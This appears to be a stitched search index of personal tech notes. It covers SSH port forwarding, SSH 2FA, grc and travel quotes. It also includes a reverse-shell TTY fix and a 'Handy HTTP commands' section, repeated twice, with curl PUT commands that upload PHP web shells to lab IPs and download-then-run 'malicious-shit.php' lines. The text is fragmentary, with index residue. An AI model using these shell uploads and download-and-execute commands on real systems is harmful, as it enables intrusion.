\"import pty;pty.spawn('/bin/bash')\" (ctrl+Z) printf \"\\n\\n(Rows,Cols)\\n \";printf '\\e[1;91m%-6s\\e[m' $(stty size);printf \"\\n\\nTerm= \\e[91m$TERM\\e[0m\\n\\n\";stty raw -echo;fg; export SHELL=bash;export TERM=xterm-256color;stty rows 20 columns 100;\\echo ;echo ;read -p \"Enter Rows:\" ROWS;read -p \"Enter Cols:\" COLS;stty rows $ROWS columns $COLS && clear Basically a fancy version of: SHELL=/bin/bash script -q /dev/null Ctrl-Z stty raw -echo fg reset xterm","title":"Fix TTY for rev shells"},{"location":"tech/security/fuzz/","text":"ffuf fuzzing dirs \u2691 ffuf -c -e \".php,.txt,/\" -w /usr/share/wordlists/allthewords.txt -u http://admirer.htb/admin-dir/FUZZ -t 75 -c color -e extensions to fuzz (requires \".\") -w wordlist -u url -t threads ffuf fuzzing vhosts \u2691 ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://quick.htb:9001 -H \"Host: FUZZ\" -mc 200 -fs 3351 -c color -w wordlist -u url -H Header to fuzz -mc match code 200 only -fs filter out size gobuster fuzzing dirs \u2691 $ gobuster dir -l -u http://backup.forwardslash.htb:80 -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt dir -

It's not often enough to keep committed to memory and I figured this might help other people as well. So let's look at some examples of local port forwarding and remote port forwarding as well as why we would need them. If you are in a hurry and just need something to jog your memory: ssh -L local_port:remote_address:remote_port username@remote_server.com <- Local ssh -R remote_port:local_address:local_port username@remote_server.com <- Remote Local Port Forwarding \u2691 \u201cLocal port forwarding\u201d allows you to access resources that aren\u2019t exposed to the Internet (or other networks). For example, if you want to access a web server at your office from your home and for security reasons, that server is only configured to accept connections from the local office network. If you have access to an SSH server at the office, and that SSH server allows connections from outside the office network, then you can connect to that SSH server from home and access the web server as if you were sitting in the office. To use local port forwarding, connect to the SSH server normally, but also supply the -L argument. The syntax is: ssh -L local_port:remote_address:remote_port username@server.com If you're still following along with the example, assume the following is true: * The web server at your office is located at 192.168.1.111 on port 8080. * You have access to the office\u2019s SSH server at ssh.youroffice.com. * Your user account on the SSH server is \"bob\". In that case, your command would look like this: ssh -L 8080:192.168.1.111:8080 bob@ssh.youroffice.com At this point, you\u2019d be able to access the webserver on port 8080 at localhost. You could just plug in http://localhost:8080 to your web browser and browse the web server as if you were in the office. All traffic sent to port 8080 on your host will be tunneled to 192.168.1.111:8080 on your office network. Pretty handy for working at home! Remote Port Forwarding \u2691 \u201cRemote port forwarding\u201d is the opposite of local forwarding, and isn\u2019t used as often. It allows you to make a resource on your local host available to a remote host. For example, let's say you\u2019re running a web server on the local PC you\u2019re sitting in front of. But your host is behind a firewall that doesn\u2019t allow incoming traffic. To use remote forwarding, use the ssh command with the -R argument. The syntax is largely the same as with local forwarding. Note the LOCAL address of your host is used this time: ssh -R remote_port:local_address:local_port username@server.com Now we assume the following: Your web application listening on port 8080 on your local host. The SSH server at your office is ssh.youroffice.com. Your user account on the SSH server is bob. You\u2019d run the following command: ssh -R 8888:localhost:1234 bob@ssh.youroffice.com Someone could then connect to the SSH server at port 8080 and that connection would be tunneled to the server application running on port 8080 on the local host you established the connection from.

I'll probably make another post about some of the other steps I took later\u2122. For now, I wanted to do a quick walkthrough of setting up 2FA for SSH with Google Authenticator . This guide was done for an Ubuntu-based host, but can be done with just about any flavor of Linux. If you aren't using 2FA for EVERYTHING you possibly can, you are doing yourself a disservice with the number of data breaches rising, some highlighting the weakness in SMS-based 2FA. You can find a list of sites that support 2FA and in many cases, how to tell other sites they should support it. It's also a good idea to use ssh keys if you aren't already. This post makes some assumptions; That you are familiar with how to edit files in a terminal, and you know what SSH and two-factor authentication is. I'm also assuming you already have your favorite authenticator app. Lastly, the usual warning about doing things at your own risk applies. If you're not careful you can lock yourself out of your host and you will be sad. There are only a few steps, read them all BEFORE you start, you've been warned! 1. Install Packages \u2691 $ sudo apt install libpam-google-authenticator 2. Configure SSH Server (with sudo/root access) \u2691 Open /etc/pam.d/sshd with your favorite text editor (vim) and add the following line: auth required pam_google_authenticator.so Edit /etc/ssh/sshd_config and set this line to yes to enable use of the Authenticator we added to the pam configuration. # Change to yes to enable challenge-response passwords ChallengeResponseAuthentication yes NOTE: DO NOT RESTART SSHD YET! 3. Set up Google Authenticator \u2691 With the package we installed in step 1, we now have a binary that allows us to configure the Google Authenticator. $ google-authenticator Read the options presented and decide what suits your needs. Selecting yes to each question is a good option. Make note of the backup codes somewhere safe. This will allow you to log into your ssh server if you don't have your app. Do you want authentication tokens to be time-based (y/n) y Do you want me to update your \"/home/user/.google_authenticator\" file? (y/n) y Do you want to disallow multiple uses of the same authentication token? This restricts you to one login about every 30s, but it increases your chances to notice or even preventing man-in-the-middle attacks (y/n) y By default, a new token is generated every 30 seconds by the mobile app. In order to compensate for possible time skew between the client and the server, we allow an extra token before and after the current time. This allows for a time skew of up to 30 seconds between authentication server and client. If you experience problems with poor time synchronization, you can increase the window from its default size of 3 permitted codes (one previous code, the current code, the next code) to 17 permitted codes (the 8 previous codes, the current code, and the 8 next codes). This will permit for a time skew of up to 4 minutes between client and server. Do you want to do so? (y/n) y If the computer that you are logging into isn't hardened against brute-force login attempts, you can enable rate-limiting for the authentication module. By default, this limits attackers to no more than 3 login attempts every 30s. Do you want to enable rate-limiting? (y/n) y 4. Add the key to your Google Authenticator App \u2691 There are many other authenticator apps aside from Google's to pick from so I'll leave it up to you to configure. I use Authy for iOS and it's pretty straightforward to set it up with the QR code from above. 5. Restart the SSH service \u2691 Now comes the moment of truth because restarting sshd will likely log out your current session (if you are logged in remotely with SSH). $ sudo service sshd restart 6. Test your access \u2691 You should now be prompted for the code as well as the usual password. If you are using keys to access your host, you will still have access using the key and won't be prompted for the code. The 2FA code has been configured to only apply to the password-based authentication. Fret not! If you have already configured ssh keys (as you should!) and want to test out your 2FA, it's pretty simple: $ ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no user@host.com Password: Verification code: Now you can rest easier knowing that even if your credentials are somehow compromised, your host will still require 2FA!","title":"2FA SSH with Google Authenticator"},{"location":"tech/security/ssh2fa/#1-install-packages","text":"$ sudo apt install libpam-google-authenticator","title":"1.

It's really helpful to see key things you are looking for in the output of a command at a glance. Sure, the output is the same, but it makes it easier to see what you are looking for. There are some examples of what it looks like below. Keep in mind I can change any of the colors, what commands use color, and what things are highlighted myself. I'm not sure how I lived without this. NOTE: The instructions below assume you already have python installed and that you are fairly comfortable with the command line. Let's go over the setup and general usage so that you can give it a try and also so I can remember how it's done later down the road. It's all in python, so it can be used pretty much anywhere. I'm currently using it on MacOS and Linux. First, we'll need the actual source code. I forked a copy for my own use so that I can keep copies of configs and share them across multiple machines. The repo is here . With the source code cloned, it's just a matter of running the included install script. NOTE: You'll need to use sudo if you go with the defaults in the install script. There is a section that outlines installation that has some useful information. Basically, you run the install script and it will copy all of the bits to a reasonable place (obviously, you can change it to meet your needs). The only trick is if you are using bash it doesn't put the config in the right place by default. I'll tweak it in all my copious spare time. You're probably wondering why I wrote anything about this when there is already plenty of information on installation and usage in the readme. Well, there is some customization I've done that I found useful to keep note of. I'll go over the \"easy\" way and then the way I did it so that all the configs are in one place and it will stay updated for other hosts. The easy way \u2691 Change to the grc directory you cloned and run sudo install.sh The conf.bashrc file wasn't copied to the location it is expected to be found. Yes, I'll probably update the install script later. For now, if you use bash, just copy grc.bashrc to /etc. For bash users add this to your ~/.bashrc : [[ -s \"/etc/grc.bashrc\" ]] && source /etc/grc.bashrc (For zsh it would be ~/.zshrc and source /etc/grc.zsh) Source your rc file or launch a new terminal and run commands that you would expect to have colored output. The git way \u2691 Instead of running the install script we'll just create a bunch of sym links to point to your config files in your repo so that you can check in new and updated configs to your own repo. For this example I'll use ~/src/rc as the location of my project. sudo ln -s /etc/grc.bashrc ~/src/grc/grc.bashrc sudo ln -s /etc/grc.conf ~/src/grc/grc.conf sudo ln -s /usr/local/share/grc ~/grc/colourfiles For bash users add this to your ~/.bashrc : [[ -s \"/etc/grc.bashrc\" ]] && source /etc/grc.bashrc (For zsh it would be ~/.zshrc and source /etc/grc.zsh) Source your rc file or launch a new terminal and run commands that you would expect to have colored output. A few notes about customizations \u2691 The included readme contains all the information you'll need to start making customizations and adding new commands you want color for. There were a few things not so obvious to me: There needs to be a conf file for each app you want to have colored output. The config file for each app is in /usr/local/share/grc . This is where colors are defined for specific output you want colored. For each conf file in /usr/local/share/grc , there needs to be an alias for it in your grc.bashrc (or grc.zshrc). For each conf file, you have to create a corresponding entry in /etc/grc.conf with the name of the config file and regex to identify the command.

For each conf file, you have to create a corresponding entry in /etc/grc.conf with the name of the config file and regex to identify the command.","title":"A few notes about customizations"},{"location":"tech/unix/grc/#some-example-output","text":"","title":"Some example output"},{"location":"tech/unix/handy-http-commands/","text":"Handy HTTP commands \u2691 curl \u2691 curl -o http://192.168.x.x/malicious-shit.php you can also pipe in commands too such as curl -o http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php User agent change curl -A \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0\" HTTP PUT \u2691 curl http://victim-site.com --upload-file file.txt curl -X PUT -d '' http://192.168.0.105/test/shell.php curl -X PUT -d '' http://10.11.1.14/shell.asp curl -X PUT -d 'http://10.11.0.220/shell-p-444.asp' http://10.11.1.14/shell.asp curl -X PUT -d '&%d 2>&%d\",f,f,f)' ?>' http://10.11.1.14/shell.txt curl -X PUT -d '\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"\"; die; }?>' http://10.11.1.229/poopypants.txt curl -X PUT -d '<?php system($_GET[\"exec\"]); ?>' http://192.168.0.105/test/shell.php -> http://192.168.0.105/test/shell.php/?exec=ifconfig curl -X PUT -d '<?php system($_REQUEST[\"exec\"]); ?>' http://10.11.1.14/shell.asp wget \u2691 wget -O - https://raw.githubusercontent.com/laurent22/joplin/master/Joplin_install_and_update.sh | bash wget -O http://192.168.x.x/malicious-shit.php you can also pipe in commands too such as wget -O http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php","title":"HTTP Commands"},{"location":"tech/unix/handy-http-commands/#handy-http-commands","text":"","title":"Handy HTTP commands"},{"location":"tech/unix/handy-http-commands/#curl","text":"curl -o http://192.168.x.x/malicious-shit.php you can also pipe in commands too such as curl -o http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php User agent change curl -A \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0\"","title":"curl"},{"location":"tech/unix/handy-http-commands/#http-put","text":"curl http://victim-site.com --upload-file file.txt curl -X PUT -d '' http://192.168.0.105/test/shell.php curl -X PUT -d '' http://10.11.1.14/shell.asp curl -X PUT -d 'http://10.11.0.220/shell-p-444.asp' http://10.11.1.14/shell.asp curl -X PUT -d '&%d 2>&%d\",f,f,f)' ?>' http://10.11.1.14/shell.txt curl -X PUT -d '\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"\"; die; }?>' http://10.11.1.229/poopypants.txt curl -X PUT -d '<?php system($_GET[\"exec\"]); ?>' http://192.168.0.105/test/shell.php -> http://192.168.0.105/test/shell.php/?exec=ifconfig curl -X PUT -d '<?php system($_REQUEST[\"exec\"]); ?>' http://10.11.1.14/shell.asp","title":"HTTP PUT"},{"location":"tech/unix/handy-http-commands/#wget","text":"wget -O - https://raw.githubusercontent.com/laurent22/joplin/master/Joplin_install_and_update.sh | bash wget -O http://192.168.x.x/malicious-shit.php you can also pipe in commands too such as wget -O http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php","title":"wget"},{"location":"tech/unix/kalivm/","text":"I recently had to export a Kali Linux VM from vmware fusion on my Mac and import it on a Linux ( Mint 20.3) machine.

I've tried to personalize this a bit by adding my own comments and feelings I associate with these quotes. \"If the road you travel has no obstacles, it leads nowhere.\" -Frank A. Clark This is true. While people always hope for a trip without problems or obstacles, those are the ones that are most memorable. Just remember (in most cases) obstacles generally result in the best stories. \u201cYou have brains in your head. Feet in your shoes. You can steer yourself any direction you choose. You\u2019re on your own. And you know what you know. And YOU are the one who\u2019ll decide where to go\u2026\u201d \u2013 Dr. Seuss I love the feeling of being in a new place and exploring all the new wonders. The only thing stopping me is me. \u201cTraveling \u2013 it leaves you speechless, then turns you into a storyteller.\u201d \u2013 Ibn Battuta This is how I hope every trip goes. There is so much beauty to see and the only thing better than seeing it is sharing it with other people. \"There is no bad weather, only inappropriate clothing.\" - Alfred Wainwright These are words I\u2019m trying to embrace more and more. If you dress for the environment you intend to be in, the weather shouldn\u2019t be an issue. I have been inside ice caves in Iceland and searing heat in Death Valley, California, but because I was completely prepared, I had a great time. \u201cThe world is a book, and those who do not travel read only one page.\u201d \u2013 Saint Augustine I have encountered people that never left their hometowns despite being 30 minutes to the country\u2019s borders. I once met someone who couldn\u2019t understand why I would be interested in traveling in the first place and I just couldn\u2019t wrap my brain around that. Who wouldn\u2019t want to see the rest of the world? \u201cBetter to see something once than hear about it a thousand times.\u201d \u2013 Asian Proverb I never fully understood this until I visited the Colosseum in Rome. We stayed at a hotel right nearby, however, we didn\u2019t know how nearby. After dropping our things off at the hotel, we went for a walk to find dinner. Just wandering around without any direction, we turned a corner and unexpectedly saw the Colosseum in all it\u2019s beauty. I will forever remember that feeling and how photos just don't do it justice. \"Fair winds and following seas.\" - Unknown[^1] This is a very popular military travel quote and coming from a Navy background, it hits very close to home.
